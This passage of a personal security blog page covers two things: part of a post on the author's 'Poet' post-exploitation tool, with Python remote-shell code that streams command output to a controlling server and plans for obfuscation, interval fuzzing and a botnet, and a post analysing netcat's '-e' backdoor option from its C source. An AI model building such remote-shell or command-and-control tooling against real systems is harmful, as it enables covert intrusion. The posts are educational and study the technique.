process. To do this, I learned to use the <code>select()</code> function which is an
easy way for an application to multiplex data streams (in this case,
the stdout of the running process, and the socket connection to the server)
and process their data without requiring concurrency at the application
level.</p>

<p>The resulting code from these two fixes is below. Select takes in multiple
file descriptors (File objects in Python) and returns which ones
are readable (in this example). After it returns, I can check which file descriptors
it returned, and proceed accordingly. In the expected case where
we can read from the process&rsquo;s stdout file descriptor, we get a line of
stdout from the process, forwarding it to the server immediately.
In the exceptional case where we can read from the socket, we receive the message,
making sure it contains the proper keyword to end the process (&lsquo;shellterm&rsquo;)
and terminating the process if it does.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">proc</span> <span class="o">=</span> <span class="n">sp</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">inp</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>    <span class="n">readable</span> <span class="o">=</span> <span class="n">select</span><span class="o">.</span><span class="n">select</span><span class="p">([</span><span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">s</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mi">30</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="n">readable</span><span class="p">:</span>
</span><span class='line'>        <span class="k">if</span> <span class="n">fd</span> <span class="o">==</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="p">:</span>  <span class="c"># proc has stdout/err to send</span>
</span><span class='line'>            <span class="n">output</span> <span class="o">=</span> <span class="n">proc</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
</span><span class='line'>            <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
</span><span class='line'>                <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span><span class='line'>            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                <span class="k">return</span>
</span><span class='line'>        <span class="k">elif</span> <span class="n">fd</span> <span class="o">==</span> <span class="n">s</span><span class="o">.</span><span class="n">s</span><span class="p">:</span>  <span class="c"># remote signal from server</span>
</span><span class='line'>            <span class="n">sig</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span><span class='line'>            <span class="k">if</span> <span class="n">sig</span> <span class="o">==</span> <span class="s">&#39;shellterm&#39;</span><span class="p">:</span>
</span><span class='line'>                <span class="n">proc</span><span class="o">.</span><span class="n">terminate</span><span class="p">()</span>
</span><span class='line'>                <span class="k">return</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s all for v0.3. Again, the v0.3 decision was pretty arbitrary and I ultimately
chose to ship it because all the other features I had lined up at
the time were
more labor intensive/experimental and I <em>really</em> wanted to get my fancy
new remote shell into master :D.</p>

<h3>Future Work</h3>

<p>At this point, I&rsquo;m pretty satisfied with the state of the project, but as
always, there&rsquo;s more work to be done. Here are some future features/ideas/improvements
that may or may not ever get implemented:</p>

<ul>
<li><strong>crypto</strong>: If anything, I&rsquo;d say encrypted communications are the one thing
keeping this from being a really usable tool. Right now, communications are
sent in the clear essentially, although they are base64 encoded for the slightest
amount of obfuscation. Ideally I&rsquo;d use Python&rsquo;s ssl library, probably doing
something like hardcoding a server public key into the client. A solution
that wouldn&rsquo;t be as much work, but only slightly more secure than the current
cleartext communications would be to use a basic xor cipher which would be
pretty easy to write, and force an analyst to retrieve the key from memory,
or the initial exchange over the network, depending on how I chose to implement it.</li>
<li><strong>protocol improvement</strong>: This shouldn&rsquo;t actually be too hard to implement,
but the data section of a poet message is typically some type of keyword, a space,
then any relevant data. For example, to start a shell, the server sends
over &ldquo;shell&rdquo;, to get recon data, the server sends &ldquo;recon&rdquo;, for an <code>exec</code>
command, the server sends over &ldquo;exec&rdquo; followed by the commands to execute.
Instead of using these string keywords, it would be possible to move them into
the protocol as a single byte after the data size and have some sort
of lookup table for referencing the appropriate action to each key.</li>
<li><strong>interval fuzzing</strong>: Instead of having a strict, predictable delay time
interval for client pings, I could implement some sort of fuzzing so that the delay
time is slightly variable for further obfuscation
purposes.</li>
</ul>


<p>and last, but not least&hellip;</p>

<ul>
<li><strong>botnet</strong>(?!): Now that I more or less have the infrastructure down for
controlling a single client, it would be pretty cool to
fork the project and adapt it for a more distributed design with multiple
clients connecting to the server, all receiving commands to execute.</li>
</ul>


<hr />

<p>Again, all the code for this project is available on <a href="http://github.com/mossberg/poet">github</a>.
Hopefully this was interesting/helpful for some people, and as always thanks for reading!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Writing this post and thinking about this again actually helped me discover a bug in the server where the server would terminate if it happened to receive a non-client HTTP request while waiting for the client. This would enable a third party that wanted to mess with the Poet user to spam the Poet user&rsquo;s machine with HTTP requests (assuming they knew the proper port to send to) at any interval smaller than the Poet interval, and effectively DOS Poet.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/11/03/netcat-exec/">Netcat &#8220;-e&#8221; Analysis</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2014-11-03'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>As I mentioned in a <a href="http://blog.mark.lc/blog/2014/03/05/netcat/">previous post</a>, netcat has this cool
<code>-e</code> parameter that lets you specify an executable to essentially turn into
a network service, that is, a process that can send and receive data over the
network. This option is option is particularly useful when called with a shell
(<code>/bin/sh</code>, <code>/bin/bash</code>, etc) as a parameter because this creates a poor man&rsquo;s
remote shell connection, and can also be used as a backdoor into the system.
As part of the <a href="https://github.com/mossberg/poet">post-exploitation tool</a> I&rsquo;m
working on, I wanted to try to add this type of remote shell feature, but it
wasn&rsquo;t immediately obvious to me
how something like this would be done, so I decided to dive into netcat&rsquo;s
source and see if I could understand how it was implemented.</p>

<p>Not knowing where to start, I first tried searching the file for &ldquo;-e&rdquo; which
brought me to:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">case</span> <span class="sc">&#39;e&#39;</span><span class="o">:</span>           <span class="cm">/* prog to exec */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">opt_exec</span><span class="p">)</span>
<span class="n">ncprint</span><span class="p">(</span><span class="n">NCPRINT_ERROR</span> <span class="o">|</span> <span class="n">NCPRINT_EXIT</span><span class="p">,</span>
    <span class="n">_</span><span class="p">(</span><span class="s">&quot;Cannot specify `-e&#39; option double&quot;</span><span class="p">));</span>
  <span class="n">opt_exec</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">optarg</span><span class="p">);</span>
  <span class="k">break</span><span class="p">;</span></code></pre></div>


<p>This snippet is using the GNU argument parsing library, getopt, to check if
&ldquo;-e&rdquo; is set, and if not, setting the global <code>char*</code> variable <code>opt_exec</code> to the
parameter. Then I tried searching for <code>opt_exec</code>, bringing me to:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">netcat_mode</span> <span class="o">==</span> <span class="n">NETCAT_LISTEN</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">opt_exec</span><span class="p">)</span> <span class="p">{</span>
<span class="n">ncprint</span><span class="p">(</span><span class="n">NCPRINT_VERB2</span><span class="p">,</span> <span class="n">_</span><span class="p">(</span><span class="s">&quot;Passing control to the specified program&quot;</span><span class="p">));</span>
<span class="n">ncexec</span><span class="p">(</span><span class="o">&amp;</span><span class="n">listen_sock</span><span class="p">);</span>       <span class="cm">/* this won&#39;t return */</span>
  <span class="p">}</span>
  <span class="n">core_readwrite</span><span class="p">(</span><span class="o">&amp;</span><span class="n">listen_sock</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stdio_sock</span><span class="p">);</span>
  <span class="n">debug_dv</span><span class="p">((</span><span class="s">&quot;Listen: EXIT&quot;</span><span class="p">));</span>
<span class="p">}</span></code></pre></div>


<p>This code checks if <code>opt_exec</code> is set, and if so calling <code>ncexec()</code>.</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="lineno"> 1</span> <span class="cm">/* Execute an external file making its stdin/stdout/stderr the actual socket */</span>
<span class="lineno"> 2</span> 
<span class="lineno"> 3</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">ncexec</span><span class="p">(</span><span class="kt">nc_sock_t</span> <span class="o">*</span><span class="n">ncsock</span><span class="p">)</span>
<span class="lineno"> 4</span> <span class="p">{</span>
<span class="lineno"> 5</span>   <span class="kt">int</span> <span class="n">saved_stderr</span><span class="p">;</span>
<span class="lineno"> 6</span>   <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
<span class="lineno"> 7</span>   <span class="n">assert</span><span class="p">(</span><span class="n">ncsock</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">ncsock</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">));</span>
<span class="lineno"> 8</span> 
<span class="lineno"> 9</span>   <span class="cm">/* save the stderr fd because we may need it later */</span>
<span class="lineno">10</span>   <span class="n">saved_stderr</span> <span class="o">=</span> <span class="n">dup</span><span class="p">(</span><span class="n">STDERR_FILENO</span><span class="p">);</span>
<span class="lineno">11</span> 
<span class="lineno">12</span>   <span class="cm">/* duplicate the socket for the child program */</span>
<span class="lineno">13</span>   <span class="n">dup2</span><span class="p">(</span><span class="n">ncsock</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">STDIN_FILENO</span><span class="p">);</span>   <span class="cm">/* the precise order of fiddlage */</span>
<span class="lineno">14</span>   <span class="n">close</span><span class="p">(</span><span class="n">ncsock</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>            <span class="cm">/* is apparently crucial; this is */</span>
<span class="lineno">15</span>   <span class="n">dup2</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">STDOUT_FILENO</span><span class="p">);</span>    <span class="cm">/* swiped directly out of &quot;inetd&quot;. */</span>
<span class="lineno">16</span>   <span class="n">dup2</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">);</span>    <span class="cm">/* also duplicate the stderr channel */</span>
<span class="lineno">17</span> 
<span class="lineno">18</span>   <span class="cm">/* change the label for the executed program */</span>
<span class="lineno">19</span>   <span class="k">if</span> <span class="p">((</span><span class="n">p</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">opt_exec</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">)))</span>
<span class="lineno">20</span>     <span class="n">p</span><span class="o">++</span><span class="p">;</span>            <span class="cm">/* shorter argv[0] */</span>
<span class="lineno">21</span>   <span class="k">else</span>
<span class="lineno">22</span>     <span class="n">p</span> <span class="o">=</span> <span class="n">opt_exec</span><span class="p">;</span>
<span class="lineno">23</span> 
<span class="lineno">24</span>   <span class="cm">/* replace this process with the new one */</span>
<span class="lineno">25</span> <span class="cp">#ifndef USE_OLD_COMPAT</span>
<span class="lineno">26</span>   <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="s">&quot;-c&quot;</span><span class="p">,</span> <span class="n">opt_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="lineno">27</span> <span class="cp">#else</span>
<span class="lineno">28</span>   <span class="n">execl</span><span class="p">(</span><span class="n">opt_exec</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="lineno">29</span> <span class="cp">#endif</span>
<span class="lineno">30</span>   <span class="n">dup2</span><span class="p">(</span><span class="n">saved_stderr</span><span class="p">,</span> <span class="n">STDERR_FILENO</span><span class="p">);</span>
<span class="lineno">31</span>   <span class="n">ncprint</span><span class="p">(</span><span class="n">NCPRINT_ERROR</span> <span class="o">|</span> <span class="n">NCPRINT_EXIT</span><span class="p">,</span> <span class="n">_</span><span class="p">(</span><span class="s">&quot;Couldn&#39;t execute %s: %s&quot;</span><span class="p">),</span>
<span class="lineno">32</span>       <span class="n">opt_exec</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="lineno">33</span> <span class="p">}</span>               <span class="cm">/* end of ncexec() */</span></code></pre></div>


<p>Here, on lines 13-16 is how the &ldquo;-e&rdquo; parameter really works. <code>dup2()</code> accepts
two file descriptors and after deallocating the second one (as if <code>close()</code>
was called on it), the second one&rsquo;s value is set to the first. So in this
case on line 13, the child process&rsquo;s stdin is being set to the file descriptor for the
network socket netcat opened. This means that the child process will view
any data received over the network will as input data and will act accordingly.
Then on lines 15 and 16, the stdout and stderr descriptors are also set to the
socket, which will cause any output the program has to be directed over the
network. As far as line 14 goes, I&rsquo;m not sure why the original socket file descriptor
has to be closed at that exact point (and based on the comments, it seems like
the netcat author wasn&rsquo;t sure either).</p>

<p>The main point is this file descriptor swapping has essentially
converted our specified program into a network service; all the input and output
will be piped over the network, and at this point the child process can
be executed. The child will replace the netcat process and will also inherit
the newly set socket file descriptors. Note that on lines 30 and 31 there&rsquo;s
some error handling code that resets the original stderr for the netcat process
and prints out an error message. This is because the code should actually
never get to this point in execution due to the <code>execl()</code> call and if it does,
there was an error executing the child.</p>

<p>I wrote this little python program to see if I understood
things correctly:</p>

<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">inp</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="k">if</span> <span class="n">inp</span> <span class="o">==</span> <span class="s">&#39;hello&#39;</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;hi</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;bye</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span></code></pre></div>


<p>It simply reads 5 bytes from stdin and prints &lsquo;hi&rsquo; if those 5 bytes were &lsquo;hello&rsquo;
otherwise printing &lsquo;bye&rsquo;.</p>

<p>Using this program as the <code>-e</code> parameter results in this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>netcat -e /tmp/test.py -lp <span class="m">8080</span> <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 19021
</span><span class='line'><span class="nv">$ </span><span class="nb">echo </span>asdfg <span class="p">|</span> netcat 127.0.0.1 8080
</span><span class='line'>bye
</span><span class='line'><span class="o">[</span>1<span class="o">]</span>+  Done                    netcat -e /tmp/blah.py -lp 8080
</span><span class='line'><span class="nv">$ </span>netcat -e /tmp/test.py -lp <span class="m">8080</span> <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 19024
</span><span class='line'><span class="nv">$ </span><span class="nb">echo </span>hello <span class="p">|</span> netcat 127.0.0.1 8080
</span><span class='line'>hi
</span><span class='line'><span class="o">[</span>1<span class="o">]</span>+  Done                    netcat -e /tmp/blah.py -lp 8080
</span></code></pre></td></tr></table></div></figure>


<p>We can see the &ldquo;server&rdquo; launched in the background. The <code>echo</code> command sends
data into netcat&rsquo;s stdin, which is being sent over the network, handled by
the python script, which sends back its response, which gets printed. Then we
can see that the server exits since the netcat process has been replaced by
the script, and the script has exited.</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/2">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>External</h1>
  <ul>
      <li>twitter: <a href="http://twitter.com/markmossberg">@markmossberg</a></li>
      <li>github: <a href="http://github.com/mossberg">@mossberg</a></li>
  </ul>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/08/18/asking-what-if-with-open/">Asking What if With Open</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/14/learning-trivia-about-mach0/">Buffers and Binary Formats</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/13/solving-cmu-binary-bomb-with-r2/">Solving Cmu Binary Bomb With R2</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/12/playing-with-vdso/">Playing With Vdso</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/06/14/building-a-simple-iot-light-switch/">Building a Simple IoT Light Switch, Pt. 2</a>
      </li>
    
  </ul>
</section>
<section>
  <h1>Categories</h1>
    <ul id="category-list"><li><a href='/blog/categories/android'>android (1)</a></li><li><a href='/blog/categories/assembly'>assembly (1)</a></li><li><a href='/blog/categories/ctf'>ctf (2)</a></li><li><a href='/blog/categories/hacking'>hacking (7)</a></li><li><a href='/blog/categories/hardware'>hardware (2)</a></li><li><a href='/blog/categories/linux'>linux (4)</a></li><li><a href='/blog/categories/programming'>programming (3)</a></li><li><a href='/blog/categories/python'>python (4)</a></li><li><a href='/blog/categories/reference'>reference (2)</a></li><li><a href='/blog/categories/reverse-engineering'>reverse engineering (2)</a></li><li><a href='/blog/categories/security'>security (6)</a></li><li><a href='/blog/categories/sysadmin'>sysadmin (4)</a></li><li><a href='/blog/categories/web'>web (3)</a></li></ul>
</section>

  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - Mark Mossberg -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'markmossberg';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
